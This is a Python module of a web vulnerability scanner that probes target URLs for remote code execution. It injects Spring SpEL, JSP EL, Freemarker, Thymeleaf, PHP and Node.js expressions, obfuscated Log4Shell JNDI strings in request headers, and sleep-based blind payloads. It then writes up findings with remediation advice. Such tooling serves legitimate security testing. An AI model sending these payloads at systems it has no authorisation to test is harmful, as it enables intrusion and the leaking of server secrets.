"""
Remote Code Execution (RCE) Scanner Module

Comprehensive RCE detection covering multiple attack vectors:
- Expression Language injection (Spring SpEL, JSP EL)
- Log4Shell (CVE-2021-44228) and JNDI injection
- Template engines leading to RCE (Freemarker, Velocity, Thymeleaf)
- Framework-specific RCE vectors
- Time-based blind RCE detection
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger
import re
import random
import string
import time

logger = get_logger(__name__)


class RCEModule(BaseModule):
    """Remote Code Execution Scanner Module"""

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize RCE module"""
        super().__init__(module_path, payload_limit=payload_limit)

        # Generate unique markers
        self.marker = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.marker_num = random.randint(100000, 999999)
        self.expected_result = str(self.marker_num * 2)

        # Canary domain for OOB detection (placeholder)
        self.canary_domain = f"{self.marker}.oob.example.com"

        # Initialize payload categories
        self._init_payloads()

        logger.info(f"RCE module loaded with multiple payload categories")

    def _init_payloads(self):
        """Initialize all RCE payload categories"""

        # Spring Expression Language (SpEL) payloads
        self.spel_payloads = [
            {
                'payload': '${7*7}',
                'detect': '49',
                'description': 'Spring SpEL arithmetic evaluation',
                'severity': 'Critical'
            },
            {
                'payload': '*{7*7}',
                'detect': '49',
                'description': 'Spring SpEL (asterisk syntax)',
                'severity': 'Critical'
            },
            {
                'payload': '${T(java.lang.System).getenv()}',
                'detect': r'(PATH|HOME|USER|JAVA_HOME)',
                'description': 'Spring SpEL environment disclosure',
                'severity': 'High',
                'regex': True
            },
            {
                'payload': f'${{T(java.lang.Math).random()}}',
                'detect': r'0\.[0-9]+',
                'description': 'Spring SpEL Math.random()',
                'severity': 'Critical',
                'regex': True
            },
            {
                'payload': f'${{"" + {self.marker_num}*2}}',
                'detect': self.expected_result,
                'description': 'Spring SpEL string concat with math',
                'severity': 'Critical'
            },
        ]

        # JSP Expression Language payloads
        self.el_payloads = [
            {
                'payload': '${applicationScope}',
                'detect': r'(javax|jakarta|application)',
                'description': 'JSP EL application scope access',
                'severity': 'High',
                'regex': True
            },
            {
                'payload': f'${{"{self.marker}"}}',
                'detect': self.marker,
                'description': 'JSP EL string evaluation',
                'severity': 'Critical'
            },
            {
                'payload': '${pageContext.request.serverName}',
                'detect': r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'description': 'JSP EL server name disclosure',
                'severity': 'Medium',
                'regex': True
            },
        ]

        # Freemarker SSTI -> RCE
        self.freemarker_payloads = [
            {
                'payload': '${.version}',
                'detect': r'[0-9]+\.[0-9]+',
                'description': 'Freemarker version disclosure',
                'severity': 'High',
                'regex': True
            },
            {
                'payload': '${7*7}',
                'detect': '49',
                'description': 'Freemarker arithmetic',
                'severity': 'Critical'
            },
            {
                'payload': f'${{{self.marker_num}*2}}',
                'detect': self.expected_result,
                'description': 'Freemarker expression evaluation',
                'severity': 'Critical'
            },
        ]

        # Thymeleaf SSTI -> RCE
        self.thymeleaf_payloads = [
            {
                'payload': f'__${{7*7}}__::.x',
                'detect': '49',
                'description': 'Thymeleaf preprocessor expression',
                'severity': 'Critical'
            },
            {
                'payload': f'__${{{self.marker_num}*2}}__::.x',
                'detect': self.expected_result,
                'description': 'Thymeleaf preprocessor RCE',
                'severity': 'Critical'
            },
        ]

        # Log4Shell / JNDI injection (info disclosure based)
        self.log4shell_payloads = [
            {
                'payload': '${jndi:ldap://127.0.0.1/test}',
                'detect': r'(jndi|ldap|lookup|javax\.naming)',
                'description': 'Log4Shell JNDI (error-based detection)',
                'severity': 'Critical',
                'regex': True
            },
            {
                'payload': '${${lower:j}ndi:ldap://127.0.0.1/a}',
                'detect': r'(jndi|ldap|lookup)',
                'description': 'Log4Shell obfuscated (lower)',
                'severity': 'Critical',
                'regex': True
            },
            {
                'payload': '${java:version}',
                'detect': r'Java|OpenJDK|[0-9]+\.[0-9]+\.[0-9]+',
                'description': 'Log4j Java version lookup',
                'severity': 'High',
                'regex': True
            },
            {
                'payload': '${env:PATH}',
                'detect': r'(bin|usr|windows)',
                'description': 'Log4j environment variable lookup',
                'severity': 'High',
                'regex': True
            },
        ]

        # PHP-specific RCE
        self.php_payloads = [
            {
                'payload': f"<?php echo '{self.marker}'; ?>",
                'detect': self.marker,
                'description': 'PHP code injection',
                'severity': 'Critical'
            },
            {
                'payload': f"<?='{self.marker}'?>",
                'detect': self.marker,
                'description': 'PHP short tag injection',
                'severity': 'Critical'
            },
            {
                'payload': 'phpinfo()',
                'detect': r'PHP Version|php\.ini',
                'description': 'PHP phpinfo() execution',
                'severity': 'Critical',
                'regex': True
            },
        ]

        # Node.js RCE
        self.nodejs_payloads = [
            {
                'payload': 'process.platform',
                'detect': r'(win32|linux|darwin)',
                'description': 'Node.js process access',
                'severity': 'Critical',
                'regex': True
            },
            {
                'payload': 'constructor.constructor("return 1+1")()',
                'detect': '2',
                'description': 'Node.js constructor chaining',
                'severity': 'Critical'
            },
        ]

        # Time-based RCE detection
        self.time_based_payloads = [
            {
                'payload': '${T(java.lang.Thread).sleep(5000)}',
                'delay': 5,
                'description': 'Java Thread.sleep() time-based'
            },
            {
                'payload': '__${T(java.lang.Thread).sleep(5000)}__::.x',
                'delay': 5,
                'description': 'Thymeleaf Thread.sleep()'
            },
            {
                'payload': 'sleep(5)',
                'delay': 5,
                'description': 'Generic sleep() time-based'
            },
        ]

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for RCE vulnerabilities

        Args:
            targets: List of URLs with parameters
            http_client: HTTP client

        Returns:
            List of vulnerability results
        """
        results = []

        logger.info(f"Starting RCE scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})
            method = target.get('method', 'GET').upper()

            if not params:
                continue

            # Detect technology for targeted testing
            tech = self._detect_technology(url, http_client)
            logger.debug(f"Detected technology: {tech}")

            # Get baseline response
            try:
                if method == 'POST':
                    baseline_response = http_client.post(url, data=params)
                else:
                    baseline_response = http_client.get(url, params=params)

                baseline_text = getattr(baseline_response, 'text', '') if baseline_response else ''
            except:
                baseline_text = ''

            # Select payloads based on technology
            payloads = self._get_payloads_for_tech(tech)

            # Test each parameter
            for param_name in params:
                if self.should_stop():
                    return results

                for payload_info in payloads:
                    payload = payload_info['payload']
                    detect_pattern = payload_info.get('detect')
                    description = payload_info['description']
                    severity = payload_info.get('severity', 'Critical')
                    is_regex = payload_info.get('regex', False)

                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        if method == 'POST':
                            response = http_client.post(url, data=test_params, timeout=10)
                        else:
                            response = http_client.get(url, params=test_params, timeout=10)

                        if not response:
                            continue

                        response_text = getattr(response, 'text', '')

                        # Check for detection pattern
                        if is_regex:
                            match = re.search(detect_pattern, response_text, re.IGNORECASE)
                            if not match:
                                continue
                            matched_value = match.group(0)

                            # FALSE POSITIVE CHECK
                            if re.search(detect_pattern, baseline_text, re.IGNORECASE):
                                continue
                        else:
                            if detect_pattern not in response_text:
                                continue
                            matched_value = detect_pattern

                            # FALSE POSITIVE CHECK
                            if detect_pattern in baseline_text:
                                continue

                        # CONFIRMED VULNERABILITY
                        evidence = self._build_evidence(
                            url, param_name, payload, description,
                            matched_value, response_text, tech, method
                        )

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param_name,
                            payload=payload[:200],
                            evidence=evidence,
                            description=f"Remote Code Execution: {description}. Arbitrary code can be executed on the server.",
                            confidence=0.92,
                            severity=severity,
                            method=method,
                            response=response_text[:3000]
                        )

                        result['technology'] = tech
                        result['matched_value'] = matched_value
                        result['verified'] = True

                        results.append(result)
                        logger.warning(f"RCE found: {description} in {param_name}")

                        # Found vuln, move to next param
                        break

                    except Exception as e:
                        logger.debug(f"Error testing RCE payload: {e}")
                        continue

                # Test time-based if no vuln found
                if not any(r.get('parameter') == param_name for r in results):
                    time_result = self._test_time_based(url, param_name, params, method, http_client)
                    if time_result:
                        results.append(time_result)

            # Test headers for Log4Shell
            header_results = self._test_log4shell_headers(url, http_client)
            results.extend(header_results)

        logger.info(f"RCE scan complete: {len(results)} vulnerabilities found")
        return results

    def _detect_technology(self, url: str, http_client: Any) -> str:
        """Detect backend technology"""
        url_lower = url.lower()

        # URL-based detection
        if '.jsp' in url_lower or '.do' in url_lower or '.action' in url_lower:
            return 'java'
        elif '.php' in url_lower:
            return 'php'
        elif '.aspx' in url_lower or '.asp' in url_lower:
            return 'dotnet'
        elif '.js' in url_lower or 'node' in url_lower:
            return 'nodejs'

        # Header-based detection
        try:
            response = http_client.get(url)
            if response:
                server = response.headers.get('Server', '').lower()
                powered = response.headers.get('X-Powered-By', '').lower()

                if 'tomcat' in server or 'java' in powered or 'jsp' in powered:
                    return 'java'
                elif 'php' in powered:
                    return 'php'
                elif 'asp.net' in powered or 'iis' in server:
                    return 'dotnet'
                elif 'express' in powered or 'node' in powered:
                    return 'nodejs'
        except:
            pass

        return 'unknown'

    def _get_payloads_for_tech(self, tech: str) -> List[Dict]:
        """Get payloads for detected technology"""
        if tech == 'java':
            return (self.spel_payloads + self.el_payloads +
                    self.freemarker_payloads + self.thymeleaf_payloads +
                    self.log4shell_payloads)
        elif tech == 'php':
            return self.php_payloads
        elif tech == 'nodejs':
            return self.nodejs_payloads
        else:
            # Unknown - test common vectors
            return (self.spel_payloads[:3] + self.log4shell_payloads[:3] +
                    self.php_payloads[:2] + self.nodejs_payloads[:2])

    def _test_time_based(self, url: str, param_name: str, params: Dict,
                          method: str, http_client: Any) -> Dict:
        """Test for time-based blind RCE"""
        # Get baseline timing
        try:
            start = time.time()
            if method == 'POST':
                http_client.post(url, data=params, timeout=10)
            else:
                http_client.get(url, params=params, timeout=10)
            baseline_time = time.time() - start
        except:
            baseline_time = 1.0

        for payload_info in self.time_based_payloads:
            try:
                payload = payload_info['payload']
                expected_delay = payload_info['delay']

                test_params = params.copy()
                test_params[param_name] = payload

                start = time.time()
                if method == 'POST':
                    response = http_client.post(url, data=test_params, timeout=15)
                else:
                    response = http_client.get(url, params=test_params, timeout=15)
                elapsed = time.time() - start

                # Check for significant delay
                if elapsed >= expected_delay - 0.5 and elapsed > baseline_time + 3:
                    evidence = f"""Time-Based RCE Detected

**URL:** {url}
**Parameter:** {param_name}
**Payload:** {payload}

**Timing Analysis:**
- Baseline response time: {baseline_time:.2f}s
- Payload response time: {elapsed:.2f}s
- Expected delay: {expected_delay}s

**Conclusion:**
The server delayed its response when the sleep payload was injected,
confirming code execution on the server.

**Security Impact:**
- Remote Code Execution
- Complete server compromise
- Data exfiltration
- Lateral movement
"""

                    result = self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=evidence,
                        description=f"Time-based RCE: {payload_info['description']}",
                        confidence=0.85,
                        severity='Critical',
                        method=method,
                        response=f"Response delayed by {elapsed:.2f}s"
                    )

                    result['detection_method'] = 'time-based'
                    result['baseline_time'] = baseline_time
                    result['response_time'] = elapsed
                    result['verified'] = True

                    logger.warning(f"Time-based RCE found in {param_name}")
                    return result

            except Exception as e:
                if 'timeout' in str(e).lower():
                    logger.debug(f"Timeout on time-based test - possible RCE")
                continue

        return None

    def _test_log4shell_headers(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test HTTP headers for Log4Shell vulnerability"""
        results = []

        headers_to_test = ['User-Agent', 'X-Forwarded-For', 'X-Api-Version', 'Referer']

        for payload_info in self.log4shell_payloads[:2]:
            payload = payload_info['payload']
            description = payload_info['description']

            for header_name in headers_to_test:
                try:
                    custom_headers = {header_name: payload}
                    response = http_client.get(url, headers=custom_headers, timeout=5)

                    if response and response.text:
                        # Check for error indicators
                        error_indicators = ['jndi', 'lookup', 'ldap', 'rmi', 'javax.naming']
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                evidence = f"""Possible Log4Shell Vulnerability

**URL:** {url}
**Injection Point:** {header_name} header
**Payload:** {payload}

**Detection:** Error-based - JNDI/lookup keywords in response
**Matched:** {indicator}

**Note:** For full confirmation, use an out-of-band callback server
to verify JNDI lookups are being made.

**Security Impact:**
- Remote Code Execution
- CVE-2021-44228 (Log4Shell)
- Complete server compromise
"""

                                result = self.create_result(
                                    vulnerable=True,
                                    url=url,
                                    parameter=f'{header_name} header',
                                    payload=payload,
                                    evidence=evidence,
                                    description=f"Possible Log4Shell: {description}",
                                    confidence=0.75,
                                    severity='Critical',
                                    method='GET (Header)',
                                    response=response.text[:2000]
                                )

                                result['cve'] = 'CVE-2021-44228'
                                result['detection_method'] = 'error-based'
                                result['verified'] = False

                                results.append(result)
                                logger.warning(f"Possible Log4Shell in {header_name}")
                                break

                except Exception as e:
                    logger.debug(f"Error testing Log4Shell header: {e}")
                    continue

        return results

    def _build_evidence(self, url: str, param: str, payload: str, desc: str,
                         match: str, response: str, tech: str, method: str) -> str:
        """Build detailed evidence string"""
        context = self.extract_response_context(response, match, 150, 100)

        evidence = f"""Remote Code Execution Confirmed

**Vulnerable URL:** {url}
**Vulnerable Parameter:** {param}
**Method:** {method}
**Detected Technology:** {tech}
**Attack Type:** {desc}

**Injected Payload:**
{payload[:300]}

**Matched Value in Response:**
{match}

**Response Context:**
{context}

**Security Impact:**
- Arbitrary code execution on the server
- Complete server compromise
- Data theft and exfiltration
- Lateral movement in the network
- Potential for ransomware deployment

**Remediation:**
- Update all frameworks and libraries to latest versions
- Disable dangerous features (eval, SpEL, JNDI lookups)
- Implement strict input validation
- Use Web Application Firewall (WAF)
- Apply principle of least privilege
"""
        return evidence


def get_module(module_path: str, payload_limit: int = None):
    """Create module instance"""
    return RCEModule(module_path, payload_limit=payload_limit)
